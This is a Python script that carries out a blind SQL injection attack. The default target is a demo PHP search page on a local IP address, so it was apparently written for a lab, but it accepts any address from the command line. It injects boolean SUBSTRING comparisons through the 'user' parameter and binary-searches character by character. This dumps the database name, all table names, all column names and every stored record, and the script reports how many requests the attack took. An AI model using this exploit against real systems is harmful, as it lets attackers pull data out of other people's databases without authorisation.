import requests
import urllib.parse
import sys
import time

db_name = ""
current_table = ""
current_attr = ""

request_counter = 0

def get_url_lt(idx, ch, url_idx):
    if url_idx == 0:
        return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) < '{ch}"
    elif url_idx == 1:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) < '{ch}"
    elif url_idx == 2:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) < '{ch}"
    elif url_idx == 3:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) < '{ch}"


def get_url_eq(idx, ch, url_idx):
    if url_idx == 0:
        return f"alice' AND (SELECT SUBSTRING((SELECT DATABASE()), {idx},1)) = '{ch}"
    elif url_idx == 1:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}'), {idx}, 1) = '{ch}"
    elif url_idx == 2:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}'), {idx}, 1) = '{ch}"
    elif url_idx == 3:
        return f"alice' AND SUBSTRING((SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}), {idx}, 1) = '{ch}"

# url = "http://192.168.1.3/demo/search.php"
def get_search_lt(idx, ch, url_idx):
    return get_url_lt(idx, ch, url_idx)

def get_search_eq(idx, ch, url_idx):
    return get_url_eq(idx, ch, url_idx)


def search_eq(url_idx):
    if url_idx == 0:
        return "alice' AND (SELECT DATABASE()) = '"
    elif url_idx == 1:
        return f"alice' and (SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '{db_name}') = '"
    elif url_idx == 2:
        return f"alice' and (SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ' ') FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{db_name}' AND TABLE_NAME = '{current_table}') = '"
    elif url_idx == 3:
        return f"alice' and (SELECT GROUP_CONCAT({current_attr} SEPARATOR ' ') FROM {current_table}) = '"

# def url_success(addr: str):
#     return f"http://{addr}/demo/user.php"
# url_success = "http://192.168.1.3/demo/user.php"

def encode_url(url, param):
    params = {
        "user": param
    }

    encoded_params = urllib.parse.urlencode(params)
    final_url = f"{url}?{encoded_params}"
    return final_url

def is_success(attack_url: str):
    response = requests.get(attack_url, timeout=5.0)
    global request_counter
    request_counter += 1
    return response.url != attack_url


def lower(idx, ch, url: str, url_idx) -> bool:
    return is_success(encode_url(url, get_search_lt(idx, ch, url_idx)))

def eq_char(idx, ch, url: str, url_idx) -> bool:
    return is_success(encode_url(url, get_search_eq(idx, ch, url_idx)))

def eq(name, url: str, url_idx) -> bool:
    return is_success(encode_url(url, search_eq(url_idx)+name))


def binary_search_char(idx, alphabet, url: str, url_idx):
    lo, hi = 0, len(alphabet) - 1

    while lo <= hi:
        mid = (lo + hi) // 2
        guess = alphabet[mid]
        if eq_char(idx, guess, url,url_idx):
            return guess
        elif lower(idx, guess, url, url_idx):
            hi = mid - 1
        else:
            lo = mid + 1
    return None


def guess_secret(url: str, url_idx):
    alphabet = "".join(chr(i) for i in range(128))
    name = ""
    idx = 1

    while True:
        if eq(name, url, url_idx):
            return name
        ch = binary_search_char(idx, alphabet, url, url_idx)
        if ch is None:
           ch = ' '
        
        name += ch
        idx += 1

def main():
    if len(sys.argv) < 2:
        address = "192.168.1.3"
    else:
        address = sys.argv[1]
    url  = f"http://{address}/demo/search.php"
    print(f"Attacking url: {url}")
    start_time = time.time()
    global db_name
    db_name = guess_secret(url, 0).lower()
    print("DB_name:", db_name)
    tables = guess_secret(url,1).lower().split(" ")
    print("tables: ", tables)
    for table in tables:
        global current_table
        current_table = table
        attrs = guess_secret(url,2).lower().split(" ")
        print(f"table: {table}: {attrs}")
        for attr in attrs:
            global current_attr
            current_attr = attr
            records = guess_secret(url,3).lower().split(" ")
            print(f"attr: {attr}: {records}")
    end_time = time.time()
    total_time = end_time - start_time
    global request_counter
    print(f"Attack took {total_time:.2f} seconds")
    print(f"Attack required {request_counter} requests")

    pass

main()
